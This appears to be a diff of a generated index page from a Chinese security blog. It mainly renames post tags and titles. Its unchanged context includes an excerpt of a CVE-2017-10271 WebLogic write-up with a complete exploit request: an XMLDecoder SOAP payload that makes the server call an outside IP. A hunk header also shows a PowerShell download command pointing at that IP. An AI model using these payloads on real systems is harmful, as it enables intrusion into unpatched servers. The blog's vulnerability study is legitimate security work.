@@ -193,7 +193,7 @@ net.exe use \\host\share attrib.exe \\host\share bcdboot.exe \\host\share bdeunl
 <hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
 <article>
     <header>
-        <h2><a href="http://wyb0.com/posts/2018/php-session-unserialize/">关于PHP SESSION反序列化</a></h2>
+        <h2><a href="http://wyb0.com/posts/2018/php-session-deserialize/">关于 PHP SESSION 反序列化</a></h2>
 
         
         <div class="post-meta">
@@ -227,7 +227,7 @@ net.exe use \\host\share attrib.exe \\host\share bcdboot.exe \\host\share bdeunl
                     
                         <a class="post-taxonomy-tag" href="http://wyb0.com/tags/php">php</a>&nbsp;&#47;
                     
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">反序列化</a>
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/deserialize">deserialize</a>
                     
                 
                 
@@ -245,7 +245,7 @@ reber@wyb:~$ html cat /proc/version Linux version 4.4.0-31-generic (buildd@lgw01
 
     
     <footer>
-        <a href="/posts/2018/php-session-unserialize/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+        <a href="/posts/2018/php-session-deserialize/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
     </footer>
     
 </article>
@@ -288,7 +288,7 @@ reber@wyb:~$ html cat /proc/version Linux version 4.4.0-31-generic (buildd@lgw01
                 
                     <i class="fa fa-tags fa-fw"></i>
                     
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">代码执行</a>
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/rce">rce</a>
                     
                 
                 
@@ -439,7 +439,7 @@ SELECT * FROM `msg` WHERE ( id=1 ) SELECT * FROM `msg` WHERE `id` = 1  前者存
 <hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
 <article>
     <header>
-        <h2><a href="http://wyb0.com/posts/2018/cve-2017-10271/">WebLogic &#39;wls-wsat&#39; XMLDecoder 反序列化漏洞</a></h2>
+        <h2><a href="http://wyb0.com/posts/2018/cve-2017-10271/">WebLogic 反序列化漏洞(CVE-2017-10271)</a></h2>
 
         
         <div class="post-meta">
@@ -471,7 +471,9 @@ SELECT * FROM `msg` WHERE ( id=1 ) SELECT * FROM `msg` WHERE `id` = 1  前者存
                 
                     <i class="fa fa-tags fa-fw"></i>
                     
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">代码执行</a>
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/rce">rce</a>&nbsp;&#47;
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/deserialize">deserialize</a>
                     
                 
                 
@@ -481,7 +483,7 @@ SELECT * FROM `msg` WHERE ( id=1 ) SELECT * FROM `msg` WHERE `id` = 1  前者存
 
     
     <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 WebLogic WLS组件反序列化漏洞 这个漏洞的编号是CVE-2017-10271，是利用Oracle WebLogic中 wls-wsat 组件的反序列化漏洞进行远程代码执行的，版本号 &lt; 10.3.6 的都受到影响，刚出来时没有看，现在记录一下
+        0x00 WebLogic WLS组件反序列化漏洞 这个漏洞的编号是 CVE-2017-10271，漏洞存在于 Oracle WebLogic 的 wls-wsat 组件中，该组件的 XMLDecoder 方法在反序列化时存在漏洞可远程代码执行，凡是版本号 &lt; 10.3.6 的都受到影响，刚出来时没有看，现在记录一下
 漏洞环境：https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271
 0x01 访问远程文件 POST /wls-wsat/CoordinatorPortType HTTP/1.1 Host: 127.0.0.1:7001 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Cookie: JSESSIONID=DJbghZRGlJf0PyyLc52n4GdvrbDkrxKWGDpwnncFpHnqsDjMT68F!-298356074 Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Length: 688 Content-Type: text/xml &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt; &lt;java version=&quot;1.8&quot; class=&quot;java.beans.XMLDecoder&quot;&gt; &lt;object id=&quot;url&quot; class=&quot;java.net.URL&quot;&gt; &lt;string&gt;http://114.115.123.123:80/aaaaaaa&lt;/string&gt; &lt;/object&gt; &lt;object idref=&quot;url&quot;&gt; &lt;void id=&quot;stream&quot; method = &quot;openStream&quot; /&gt; &lt;/object&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt; &lt;/soapenv:Envelope&gt;  0x02 写入文件 POST /wls-wsat/CoordinatorPortType HTTP/1.
     </p>
@@ -784,6 +786,11 @@ powershell (new-object System.Net.WebClient).DownloadFile(&quot;http://114.115.1
             </p>
         
             <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/backdoor" title="backdoor">backdoor</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/cgi" title="cgi">cgi</a>
                 <sup>1</sup>
             </p>
@@ -809,6 +816,11 @@ powershell (new-object System.Net.WebClient).DownloadFile(&quot;http://114.115.1
             </p>
         
             <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/deserialize" title="deserialize">deserialize</a>
+                <sup>3</sup>
+            </p>
+        
+            <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/dmz" title="dmz">dmz</a>
                 <sup>1</sup>
             </p>
@@ -816,6 +828,11 @@ powershell (new-object System.Net.WebClient).DownloadFile(&quot;http://114.115.1
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/docker" title="docker">docker</a>
                 <sup>6</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/fileupload" title="fileupload">fileupload</a>
+                <sup>3</sup>
             </p>
         
             <p style="display:inline-block;">
@@ -914,6 +931,11 @@ powershell (new-object System.Net.WebClient).DownloadFile(&quot;http://114.115.1
             </p>
         
             <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/rce" title="rce">rce</a>
+                <sup>6</sup>
+            </p>
+        
+            <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/redis" title="redis">redis</a>
                 <sup>2</sup>
             </p>
@@ -974,32 +996,12 @@ powershell (new-object System.Net.WebClient).DownloadFile(&quot;http://114.115.1
             </p>
         
             <p style="display:inline-block;">
-                <a href="http://wyb0.com/tags/%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c" title="代码执行">代码执行</a>
-                <sup>5</sup>
-            </p>
-        
-            <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/%e4%bf%a1%e6%81%af%e6%b3%84%e9%9c%b2" title="信息泄露">信息泄露</a>
                 <sup>2</sup>
             </p>
         
             <p style="display:inline-block;">
-                <a href="http://wyb0.com/tags/%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" title="反序列化">反序列化</a>
-                <sup>2</sup>
-            </p>
-        
-            <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/%e5%8f%8d%e5%bc%b9shell" title="反弹shell">反弹shell</a>
-                <sup>1</sup>
-            </p>
-        
-            <p style="display:inline-block;">
-                <a href="http://wyb0.com/tags/%e5%90%8e%e9%97%a8" title="后门">后门</a>
-                <sup>1</sup>
-            </p>
-        
-            <p style="display:inline-block;">
-                <a href="http://wyb0.com/tags/%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" title="命令执行">命令执行</a>
                 <sup>1</sup>
             </p>
         
@@ -1011,11 +1013,6 @@ powershell (new-object System.Net.WebClient).DownloadFile(&quot;http://114.115.1
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/%e6%95%8f%e6%84%9f%e4%bf%a1%e6%81%af%e6%b3%84%e9%9c%b2" title="敏感信息泄露">敏感信息泄露</a>
                 <sup>1</sup>
-            </p>
-        
-            <p style="display:inline-block;">
-                <a href="http://wyb0.com/tags/%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0" title="文件上传">文件上传</a>
-                <sup>3</sup>
             </p>
         
             <p style="display:inline-block;">
